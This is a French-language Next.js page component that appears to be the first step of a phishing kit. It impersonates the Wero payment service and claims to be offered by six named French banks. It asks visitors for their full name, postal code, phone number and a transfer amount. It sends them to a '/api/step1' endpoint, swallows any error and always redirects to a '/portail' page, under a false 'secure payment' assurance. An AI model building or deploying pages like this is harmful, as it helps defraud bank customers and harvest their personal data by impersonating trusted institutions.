'use client';

import React, { useState, FormEvent } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';

export default function InfosPage() {
  const router = useRouter();
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const [nomPrenom, setNomPrenom] = useState('');
  const [codePostal, setCodePostal] = useState('');
  const [telephone, setTelephone] = useState('');
  const [montant, setMontant] = useState('');

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    const formData = {
      nomPrenom,
      codePostal,
      telephone,
      montant,
    };

    try {
      await fetch('/api/step1', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });
    } catch (err) {
      console.error('Erreur lors de l’envoi step1 :', err);
    } finally {
      router.push('/portail');
    }
  };

  return (
    <div className="min-h-screen bg-[#F7F9FC] text-[#1E293B] font-sans flex justify-center items-center sm:py-6">
      {/* Conteneur App Mobile */}
      <div className="w-full max-w-md min-h-screen sm:min-h-[840px] bg-white sm:rounded-3xl sm:shadow-2xl flex flex-col justify-between overflow-hidden relative border border-slate-100">
        
        {/* Header avec Logo Image */}
        <header className="px-6 py-4 flex items-center justify-between border-b border-slate-100 bg-white sticky top-0 z-20">
          <Link href="/" className="flex items-center hover:opacity-80 transition-opacity">
            <img 
              src="/flavicon.ico" 
              alt="Wero" 
              className="h-8 w-auto object-contain"
            />
          </Link>

          <button
            type="button"
            onClick={() => setIsMenuOpen(!isMenuOpen)}
            aria-label="Menu"
            className="p-2 rounded-xl text-slate-800 hover:bg-slate-50 transition-colors focus:outline-none"
          >
            <div className="w-6 h-4 flex flex-col justify-between">
              <span className={`h-0.5 w-full bg-slate-800 rounded-full transition-all duration-300 ${isMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`} />
              <span className={`h-0.5 w-full bg-slate-800 rounded-full transition-all duration-300 ${isMenuOpen ? 'opacity-0' : ''}`} />
              <span className={`h-0.5 w-full bg-slate-800 rounded-full transition-all duration-300 ${isMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`} />
            </div>
          </button>
        </header>

        {/* Menu Déroulant */}
        {isMenuOpen && (
          <div className="absolute top-[70px] left-0 w-full bg-white/95 backdrop-blur-md border-b border-slate-100 p-4 shadow-xl z-30 animate-in fade-in slide-in-from-top-2 duration-200">
            <nav className="flex flex-col gap-2 font-medium text-slate-700">
              <Link href="/" className="p-3 hover:bg-slate-50 rounded-xl transition-colors text-sm font-semibold" onClick={() => setIsMenuOpen(false)}>
                Accueil
              </Link>
            </nav>
          </div>
        )}

        {/* Contenu Principal */}
        <main className="flex-1 px-6 py-6 flex flex-col justify-start">
          <h1 className="text-2xl font-black text-slate-900 tracking-tight text-center mb-6 flex items-center justify-center gap-2">
            <span>Informations personnelles</span>
            <svg className="w-6 h-6 text-slate-800" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a2 2 0 002-2V7a2 2 0 00-2-2H6a2 2 0 00-2 2v10a2 2 0 002 2z" />
            </svg>
          </h1>

          {/* Encart de sécurité */}
          <div className="p-4 rounded-2xl bg-slate-50 border border-slate-100 mb-6 text-center">
            <div className="flex items-center justify-center gap-1.5 font-bold text-slate-800 text-sm mb-1">
              <span>Paiement sécurisé</span>
              <svg className="w-4 h-4 text-slate-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2V7a2 2 0 00-2-2H6a2 2 0 00-2 2v10a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
            </div>
            <p className="text-xs text-slate-500 font-medium leading-relaxed">
              Vos informations sont traitées de manière sécurisée pour garantir la protection de vos données.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="flex flex-col gap-4">
            {/* Nom et prénom */}
            <div>
              <label className="block text-xs font-bold text-slate-800 mb-1.5 flex items-center gap-1.5">
                <svg className="w-4 h-4 text-slate-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                </svg>
                <span>Nom et prénom(s)</span>
                <span className="text-red-500">*</span>
              </label>
              <input
                type="text"
                required
                value={nomPrenom}
                onChange={(e) => setNomPrenom(e.target.value)}
                placeholder="Ex: Jean Dupont"
                className="w-full px-4 py-3.5 bg-white border border-slate-200 rounded-xl text-base font-medium text-slate-800 outline-none focus:border-slate-400 transition-colors"
              />
            </div>

            {/* Code postal */}
            <div>
              <label className="block text-xs font-bold text-slate-800 mb-1.5 flex items-center gap-1.5">
                <svg className="w-4 h-4 text-slate-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
                </svg>
                <span>Code postal</span>
                <span className="text-red-500">*</span>
              </label>
              <input
                type="text"
                required
                inputMode="numeric"
                maxLength={5}
                value={codePostal}
                onChange={(e) => setCodePostal(e.target.value.replace(/\D/g, ''))}
                placeholder="Ex: 75008"
                className="w-full px-4 py-3.5 bg-white border border-slate-200 rounded-xl text-base font-medium text-slate-800 outline-none focus:border-slate-400 transition-colors"
              />
            </div>

            {/* Numéro de téléphone */}
            <div>
              <label className="block text-xs font-bold text-slate-800 mb-1.5 flex items-center gap-1.5">
                <svg className="w-4 h-4 text-slate-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
                </svg>
                <span>Numéro de téléphone</span>
                <span className="text-red-500">*</span>
              </label>
              <input
                type="tel"
                required
                value={telephone}
                onChange={(e) => setTelephone(e.target.value)}
                placeholder="06 00 00 00 00"
                className="w-full px-4 py-3.5 bg-white border border-slate-200 rounded-xl text-base font-medium text-slate-800 outline-none focus:border-slate-400 transition-colors"
              />
            </div>

            {/* Montant */}
            <div>
              <label className="block text-xs font-bold text-slate-800 mb-1.5 flex items-center gap-1.5">
                <svg className="w-4 h-4 text-slate-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                <span>Montant du virement (€)</span>
                <span className="text-red-500">*</span>
              </label>
              <input
                type="number"
                required
                inputMode="decimal"
                value={montant}
                onChange={(e) => setMontant(e.target.value)}
                placeholder="Ex: 150"
                className="w-full px-4 py-3.5 bg-white border border-slate-200 rounded-xl text-base font-medium text-slate-800 outline-none focus:border-slate-400 transition-colors"
              />
            </div>

            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full py-4 mt-2 bg-[#FFE800] hover:bg-[#ebd300] active:scale-[0.99] text-black font-extrabold text-sm tracking-wider rounded-2xl shadow-sm transition-all text-center uppercase flex items-center justify-center gap-2"
            >
              {isSubmitting ? (
                <span className="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin" />
              ) : (
                'CONTINUER'
              )}
            </button>
          </form>
        </main>

        {/* Footer Partenaires */}
          <footer className="w-full px-5 py-5 border-t border-slate-100 bg-slate-50/50 text-center shrink-0">
        <p className="text-xs font-medium text-slate-500 mb-3.5">
          Ce service vous est proposé par :
        </p>

          <div className="flex items-center justify-center gap-3.5 flex-wrap">
            <img src="/Societe-Generale-Emblem.png" alt="Société Générale" className="h-4 sm:h-5 object-contain" />
            <img src="/BP-1.png" alt="Banque Populaire" className="h-4 sm:h-5 object-contain" />
            <img src="/logo_BanquePostale_600x300.webp" alt="La Banque Postale" className="h-4 sm:h-5 object-contain" />
            <img src="/12895685.png" alt="Caisse d'Épargne" className="h-4 sm:h-5 object-contain" />
            <img src="/IMG_9197.png" alt="Crédit Agricole" className="h-4 sm:h-5 object-contain" />
            <img src="/unnamed.jpg" alt="Crédit Mutuel" className="h-4 sm:h-5 object-contain" />
          </div>
        </footer>

      </div>
    </div>
  );
}